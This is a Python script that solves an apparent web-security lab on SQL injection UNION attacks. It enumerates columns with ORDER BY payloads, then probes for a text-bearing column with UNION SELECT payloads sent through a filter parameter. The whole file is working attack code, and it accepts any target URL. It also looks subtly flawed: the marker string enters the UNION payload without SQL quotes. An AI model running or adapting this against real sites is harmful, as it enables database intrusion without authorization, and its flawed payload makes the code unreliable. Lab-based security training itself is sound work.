# SQL injection UNION attack, finding a column containing text
# To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided.

import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = "filter?category=Pets"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+"+ str(i) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if("Internal Server Error") in res:
            return i-1
        i = i+1
    return False

def exploit_sqli_string(url, num_col):
    path = "filter?category=Pets"
    for i in range(1 , num_col + 1):
        string = "OR2dm9"
        payload_list = ['NULL'] * num_col
        payload_list[i-1] = string
        sql_payload = "'union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip("'") in res:
            return i 
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out no. of columns...")
    num_col = exploit_sqli(url)

    if num_col:
        print("[+] No. of columns are:", num_col)
        print("[+] Figuring out which column contains text")
        string_column = exploit_sqli_string(url, num_col)
        if string_column:
            print("[+] Column contains text is", string_column)
    else:
        print("Got no SQL Injection")


        
